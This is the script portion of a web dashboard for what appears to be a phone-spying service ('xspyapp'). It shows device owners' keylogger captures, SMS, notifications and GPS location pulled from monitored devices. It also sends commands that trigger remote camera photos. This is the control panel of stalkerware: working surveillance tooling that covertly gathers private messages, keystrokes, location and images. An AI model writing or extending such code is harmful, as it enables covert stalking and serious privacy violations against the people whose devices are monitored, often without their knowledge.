        // Auth Tabs
        loginTabBtn.addEventListener('click', () => { authMode = 'login'; loginTabBtn.classList.add('active'); signupTabBtn.classList.remove('active'); submitAuthBtnText.textContent = 'Login'; errorMessage.textContent = ''; });
        signupTabBtn.addEventListener('click', () => { authMode = 'signup'; signupTabBtn.classList.add('active'); loginTabBtn.classList.remove('active'); submitAuthBtnText.textContent = 'Sign Up'; errorMessage.textContent = ''; });
        
        // Auth Submission
        submitAuthBtn.addEventListener('click', () => {
            const email = emailInput.value; const password = passwordInput.value; errorMessage.textContent = '';
            if (!email || !password) { errorMessage.textContent = 'Please enter both email and password.'; return; }
            if (authMode === 'login') {
                signInWithEmailAndPassword(auth, email, password).catch(error => { errorMessage.textContent = getFriendlyAuthError(error.code); });
            } else {
                createUserWithEmailAndPassword(auth, email, password).then(() => { showToast('Sign-up Successful!'); authContainer.style.display = 'none'; signupSuccessModal.style.display = 'flex'; }).catch(error => { errorMessage.textContent = getFriendlyAuthError(error.code); });
            }
        });

        // Other Buttons
        homeRedirectBtn.addEventListener('click', () => { window.location.href = 'https://xspyapp.com/'; });
        document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));

        // --- Auth State ---
        onAuthStateChanged(auth, user => {
            if (user) {
                if (signupSuccessModal.style.display !== 'flex') { authContainer.style.display = 'none'; dashboard.style.display = 'flex'; }
                loadUserDevices(user.uid);
            } else {
                authContainer.style.display = 'flex'; dashboard.style.display = 'none'; userList.innerHTML = ''; detailsView.style.display = 'none'; mainContentTitle.textContent = 'Select a Device'; liveChatBtn.disabled = true;
                if(activeDataListener) off(activeDataListener.ref);
                if(activeNotificationListener) off(activeNotificationListener.ref);
                if(activeChatListener) off(activeChatListener.ref);
            }
        });

        // --- Data Loading and Display ---

        function loadUserDevices(userId) {
            const usersRef = ref(db, `user/${userId}`);
            onValue(usersRef, (snapshot) => {
                userList.innerHTML = '';
                const data = snapshot.val();
                if (data) {
                    Object.keys(data).forEach(childKey => {
                        const childData = data[childKey]; const userName = childData?.data?.nameChild || childKey; const deviceName = childData?.data?.nameDevice || 'Unknown Device'; const listItem = document.createElement('li'); listItem.className = 'user-list-item'; listItem.dataset.userid = userId; listItem.dataset.childkey = childKey; listItem.dataset.username = userName; listItem.dataset.devicename = deviceName; listItem.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><div><div class="user-name">${userName}</div><div class="device-name">${deviceName}</div></div>`;
                        userList.appendChild(listItem);
                    });
                } else { userList.innerHTML = '<li>No devices found.</li>'; }
            });
        }
        
        userList.addEventListener('click', (e) => {
            const listItem = e.target.closest('.user-list-item');
            if (listItem) {
                document.querySelectorAll('.user-list-item.active').forEach(item => item.classList.remove('active')); listItem.classList.add('active');
                selectedChildInfo = { userId: listItem.dataset.userid, childKey: listItem.dataset.childkey, userName: listItem.dataset.username, deviceName: listItem.dataset.devicename };
                mainContentTitle.textContent = `${selectedChildInfo.userName}`; detailsView.style.display = 'block'; liveChatBtn.disabled = false;
                setupNotificationListener(selectedChildInfo.userId, selectedChildInfo.childKey);
                if (window.innerWidth <= 992) { sidebar.classList.remove('open'); overlay.style.display = 'none'; }
            }
        });

        categoryButtonsContainer.addEventListener('click', (e) => {
            const button = e.target.closest('.category-btn');
            if (button) {
                const category = button.dataset.category;
                if (category === 'coming-soon') { openComingSoonModal(button.dataset.featureName); } else { openDataModal(category); }
            }
        });

        function displayCategoryData(category) {
            if (activeDataListener) off(activeDataListener.ref);
            modalDataDisplayArea.innerHTML = '<div class="loader"></div>'; const { userId, childKey } = selectedChildInfo;
            if (!userId || !childKey) { modalDataDisplayArea.innerHTML = '<p>Please select a device first.</p>'; return; }
            if (category === 'photo') { renderPhotosFromStorage(userId, childKey); return; }
            const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`; const dataRef = ref(db, dataPath); activeDataListener = { ref: dataRef };
            onValue(dataRef, (snapshot) => { renderDataAsCards(category, snapshot.val()); }, (error) => { console.error("Firebase read failed: " + error.code); modalDataDisplayArea.innerHTML = `<p>Error fetching data.</p>`; });
        }

        // --- Card Rendering Function ---
        function renderDataAsCards(category, data) {
            let contentHTML = '';
            if (!data || Object.keys(data).length === 0) {
                contentHTML = '<p>No data available in this category.</p>';
                modalDataDisplayArea.innerHTML = contentHTML;
                return;
            }

            const dataArray = Object.values(data).reverse(); // Show newest first

            switch(category) {
                case 'location':
                    const loc = data; // Location is an object, not an array
                    let mapLink = '';
                    if (loc.latitude && loc.longitude) {
                         // FIX: Corrected Google Maps URL
                        mapLink = `<a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
                    }
                    contentHTML = `
                        <div class="data-card location-card">
                            <div class="data-card-body">
                                <div>
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg>
                                    <div><strong>Address:</strong><br>${loc.address || 'N/A'}</div>
                                </div>
                                <div>
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                                    <div><strong>Time:</strong><br>${loc.dateTime || 'N/A'}</div>
                                </div>
                                ${mapLink}
                            </div>
                        </div>`;
                    break;

                case 'keylogger':
                    contentHTML = '<div class="data-list">';
                    dataArray.forEach(log => {
                        if (log && log.keyText) {
                            const parts = log.keyText.split(' |');
                            const time = parts[0] || '';
                            const action = (parts[1] || '').replace(/[()]/g, '');
                            const text = parts[2] || '';
                            contentHTML += `
                                <div class="data-card">
                                    <div class="data-card-header">
                                        <div class="data-card-title">${action}</div>
                                    </div>
                                    <div class="data-card-body"><strong>${text}</strong></div>
                                    <div class="data-card-footer">${time}</div>
                                </div>`;
                        }
                    });
                    contentHTML += '</div>';
                    break;
                
                case 'sms':
                    contentHTML = '<div class="data-list">';
                    dataArray.forEach(sms => {
                        if (sms) {
                            const isOutgoing = sms.type === 2;
                            const title = isOutgoing ? `From: ${sms.smsAddress || 'Unknown'}` : 'Sent SMS';
                            const iconColor = isOutgoing ? 'var(--accent-blue)' : 'var(--accent-teal)';
                            
                            contentHTML += `
                                <div class="data-card">
                                     <div class="data-card-header">
                                        <div class="data-card-icon">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="${iconColor}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
                                        </div>
                                        <div class="data-card-title">${title}</div>
                                    </div>
                                    <div class="data-card-body">${sms.smsBody || ''}</div>
                                    <div class="data-card-footer">${sms.dateTime || ''}</div>
                                </div>`;
                        }
                    });
                    contentHTML += '</div>';
                    break;

                case 'notifications':
                    contentHTML = '<div class="data-grid">';
                     dataArray.forEach(notif => {
                        if (notif) {
                            let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-pink)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`;
                            const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase();
                            if (fullText.includes('whatsapp')) { appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`; }
                            
                            contentHTML += `
                                <div class="data-card">
                                    <div class="data-card-header">
                                        <div class="data-card-icon">${appIcon}</div>
                                        <div class="data-card-title">${notif.title || 'Notification'}</div>
                                    </div>
                                    <div class="data-card-body">${notif.text || ''}</div>
                                    <div class="data-card-footer">${notif.dateTime || ''}</div>
                                </div>`;
                        }
                    });
                    contentHTML += '</div>';
                    break;
            }
            modalDataDisplayArea.innerHTML = contentHTML;
        }

        async function renderPhotosFromStorage(userId, childKey) {
            const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="1"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="0"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button></div>`;
            modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
            try {
                const photoDirRef = storageRef(storage, `user/${userId}/${childKey}/photo`);
                const res = await listAll(photoDirRef);
                if (res.items.length === 0) {
                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>';
                    return;
                }
                const photoPromises = res.items.map(itemRef => Promise.all([getDownloadURL(itemRef), getMetadata(itemRef)]));
                const photosWithData = await Promise.all(photoPromises);
                let photoGridHTML = '<div class="data-grid">';
                photosWithData.sort((a, b) => new Date(b[1].timeCreated) - new Date(a[1].timeCreated)).forEach(([url, metadata]) => {
                    const timeCreated = new Date(metadata.timeCreated).toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
                    photoGridHTML += `
                        <div class="data-card photo-card">
                            <img src="${url}" alt="Captured photo" style="width:100%; height: 200px; object-fit: cover; border-radius: 8px 8px 0 0;" onerror="this.onerror=null;this.src='https://placehold.co/300x200/162136/E0E7FF?text=Error';">
                            <div style="padding: 1rem;">
                                <div class="data-card-footer" style="text-align: left;">${timeCreated}</div>
                                <a href="${url}" target="_blank" class="map-link" style="width: 100%; justify-content: center;">View Full Image</a>
                            </div>
                        </div>`;
                });
                photoGridHTML += '</div>';
                modalDataDisplayArea.innerHTML = headerHTML + photoGridHTML;
            } catch (error) {
                console.error("Error fetching photos:", error);
                modalDataDisplayArea.innerHTML = headerHTML + `<p>Error loading photos.</p>`;
            }
        }
        
        // --- Modal and Helper Functions ---

        function getCategoryPath(category) {
            switch (category) {
                case 'location': return 'location/data'; case 'photo': return 'photo/data'; case 'keylogger': return 'keyLogger/data'; case 'notifications': return 'notificationsMessages/data'; case 'sms': return 'sms/data'; default: return '';
            }
        }

        function openDataModal(category) { modalTitle.textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`; dataModal.style.display = 'flex'; displayCategoryData(category); }
        function openComingSoonModal(featureName) { comingSoonTitle.textContent = `${featureName} - Coming Soon`; comingSoonModal.style.display = 'flex'; }
        
        liveChatBtn.addEventListener('click', () => {
            if (liveChatBtn.disabled) return;
            const { userId, childKey } = selectedChildInfo;
            if (!userId) return;
            chatModal.style.display = 'flex';
            setupChat(userId, childKey);
        });

        function setupChat(userId, childKey) {
            const chatMessagesArea = document.getElementById('chat-messages-area');
            const chatSendBtn = document.getElementById('chat-send-btn');
            const chatMessageInput = document.getElementById('chat-message-input');
            
            const sendMessage = () => {
                const messageText = chatMessageInput.value.trim();
                if (messageText) {
                    const messagesRef = ref(db, `chats/${userId}/${childKey}/messages`);
                    // Push user message
                    push(messagesRef, { text: messageText, sender: 'user', timestamp: serverTimestamp() })
                    .then(() => {
                        // Then push auto-reply
                        const autoReplyText = 'Your request is in the queue! 🚀\nWe have received your query and will reply within 24 hours.';
                        push(messagesRef, {
                             text: autoReplyText,
                             sender: 'auto-reply', 
                             timestamp: serverTimestamp()
                        });
                        console.log("Message Sent to Firebase:", { text: messageText, sender: 'user' });
                    })
                    .catch(error => console.error("Error sending message:", error));
                    
                    chatMessageInput.value = '';
                }
            };
            
            chatSendBtn.onclick = sendMessage;
            chatMessageInput.onkeypress = (e) => { if (e.key === 'Enter') { e.preventDefault(); sendMessage(); } };
            
            const chatPath = `chats/${userId}/${childKey}/messages`;
            const chatQuery = query(ref(db, chatPath));
            
            if (activeChatListener) off(activeChatListener.ref);
            activeChatListener = { ref: chatQuery };

            onValue(chatQuery, (snapshot) => {
                chatMessagesArea.innerHTML = '';
                if (snapshot.exists()) {
                    snapshot.forEach((childSnapshot) => {
                        const message = childSnapshot.val();
                        const bubble = document.createElement('div');
                        bubble.classList.add('chat-bubble', message.sender);
                        const time = message.timestamp ? new Date(message.timestamp).toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' }) : '';
                        bubble.innerHTML = `${message.text.replace(/\n/g, '<br>')}<span class="chat-time">${time}</span>`;
                        chatMessagesArea.appendChild(bubble);
                    });
                     chatMessagesArea.scrollTop = chatMessagesArea.scrollHeight;
                } else {
                    chatMessagesArea.innerHTML = '<p style="text-align:center; padding: 2rem;">No messages yet. Start the conversation!</p>';
                }
            });
        }
        
        modalDataDisplayArea.addEventListener('click', (e) => {
            const button = e.target.closest('button');
            if (!button) return;
            const { userId, childKey } = selectedChildInfo;
            if (button.classList.contains('capture-photo-btn')) {
                const facing = button.dataset.facing; if (facing === undefined) return;
                const paramsRef = ref(db, `user/${userId}/${childKey}/photo/params`); const span = button.querySelector('span'); const originalText = span.textContent; button.disabled = true; span.textContent = 'Sending...';
                update(paramsRef, { capturePhoto: true, facingPhoto: parseInt(facing) })
                    .then(() => { span.textContent = 'Command Sent!'; setTimeout(() => { span.textContent = originalText; button.disabled = false; }, 3000); })
                    .catch((error) => { console.error("Error sending command: ", error); alert("Failed to send command."); span.textContent = originalText; button.disabled = false; });
            }
            if (button.id === 'refresh-photos-btn') { displayCategoryData('photo'); }
        });

        // FIX: Mobile menu toggle logic
        menuBtn.addEventListener('click', () => { 
            sidebar.classList.toggle('open'); 
            overlay.style.display = sidebar.classList.contains('open') ? 'block' : 'none';
        });
        overlay.addEventListener('click', () => { 
            sidebar.classList.remove('open'); 
            overlay.style.display = 'none'; 
        });
        
        document.querySelectorAll('.modal-overlay').forEach(modal => {
            modal.addEventListener('click', e => {
                if (e.target.classList.contains('modal-overlay') || e.target.closest('.ok-btn') || e.target.closest('.modal-close-btn')) {
                    const targetId = e.target.closest('.modal-overlay').id;
                    if (activeDataListener && targetId === 'data-modal') { off(activeDataListener.ref); activeDataListener = null; }
                    if (activeChatListener && targetId === 'chat-modal') {
                        if(activeChatListener.ref) off(activeChatListener.ref);
                        activeChatListener = null; 
                        const chatSendBtn = document.getElementById('chat-send-btn');
                        if(chatSendBtn) chatSendBtn.onclick = null; 
                    }
                    modal.style.display = 'none';
                }
            });
        });

        function getFriendlyAuthError(errorCode) {
            switch (errorCode) {
                case 'auth/invalid-email': return 'Please enter a valid email address.'; case 'auth/user-not-found': case 'auth/wrong-password': return 'Invalid email or password.'; case 'auth/email-already-in-use': return 'This email is already registered. Please login.'; case 'auth/weak-password': return 'Password should be at least 6 characters long.'; default: 'An error occurred. Please try again.';
            }
        }
        function showToast(message) { toastNotification.textContent = message; toastNotification.classList.add('show'); setTimeout(() => { toastNotification.classList.remove('show'); }, 3000); }
        function updateOnlineStatus() { offlineBanner.style.display = navigator.onLine ? 'none' : 'block'; }
        window.addEventListener('online', updateOnlineStatus);
        window.addEventListener('offline', updateOnlineStatus);
        updateOnlineStatus();
        
        function setupNotificationListener(userId, childKey) {
            if (activeNotificationListener) off(activeNotificationListener.ref);
            const notificationsPath = `user/${userId}/${childKey}/adminNotifications`;
            const notificationsQuery = query(ref(db, notificationsPath), orderByChild('read'), equalTo(false));
            activeNotificationListener = { ref: notificationsQuery };
            onValue(notificationsQuery, (snapshot) => {
                snapshot.forEach((childSnapshot) => {
                    const notification = childSnapshot.val(); const notificationKey = childSnapshot.key;
                    adminNotificationText.textContent = notification.message; adminNotificationModal.style.display = 'flex';
                    const notificationRef = ref(db, `${notificationsPath}/${notificationKey}`); update(notificationRef, { read: true });
                });
            });
        }

    </script>
</body>
</html>